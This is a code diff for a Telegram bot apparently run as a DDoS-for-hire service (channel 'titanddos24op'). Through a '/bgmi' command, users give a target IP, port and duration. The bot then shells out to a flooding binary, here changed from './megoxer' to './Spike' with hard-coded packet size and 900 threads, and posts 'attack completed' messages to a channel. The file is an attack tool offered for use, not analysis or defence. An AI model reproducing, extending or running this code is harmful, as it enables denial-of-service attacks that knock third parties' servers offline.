@@ -22,6 +22,9 @@ CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID 
 FEEDBACK_CHANNEL_ID = '-1002124760113'  # Replace with your specific channel ID for feedback
 message_queue = []
 
+PREDEFINED_PACKET_SIZE = 8  # Example: 1024 bytes
+PREDEFINED_THREAD_COUNT = 900  # Example: 500 threads
+
 # Official channel details
 OFFICIAL_CHANNEL = "@titanddos24op"  # Replace with your channel username or ID
 CHANNEL_LINK = "https://t.me/titanddos24op"  # Replace with your channel link
@@ -155,7 +158,6 @@ def handle_photo(message):
             os.remove(image_path)
 
 
-# Attack command handler
 @bot.message_handler(commands=['bgmi'])
 def bgmi_command(message):
     global attack_in_progress
@@ -276,11 +278,11 @@ def check_membership(call):
         bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet. Please join and try again.")
 
 async def execute_attack(ip, port, duration, username):
-    """Run attack command asynchronously and wait for the duration to complete."""
+    """Run attack command asynchronously with predefined packet size and thread count."""
     try:
-        # Start the attack process
+        # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./megoxer {ip} {port} {duration}",
+            f"./Spike {ip} {port} {duration} {PREDEFINED_PACKET_SIZE} {PREDEFINED_THREAD_COUNT}",
             stderr=asyncio.subprocess.PIPE
         )
 
@@ -290,7 +292,8 @@ async def execute_attack(ip, port, duration, username):
         # Send attack completion message
         bot.send_message(
             CHANNEL_ID,
-            f"✅ Attack on {ip}:{port} completed after {duration} seconds."
+            f"✅ Attack on {ip}:{port} completed! "
+            f"Duration: {duration}s, Packet Size: {PREDEFINED_PACKET_SIZE}, Threads: {PREDEFINED_THREAD_COUNT}"
         )
     except Exception as e:
         # Send error message if something goes wrong
@@ -411,8 +414,3 @@ def message_worker():
 
 # Start worker thread
 threading.Thread(target=message_worker, daemon=True).start()
-
-
-if __name__ == "__main__":
-    logging.info("Bot started")
-    bot.polling(none_stop=True)
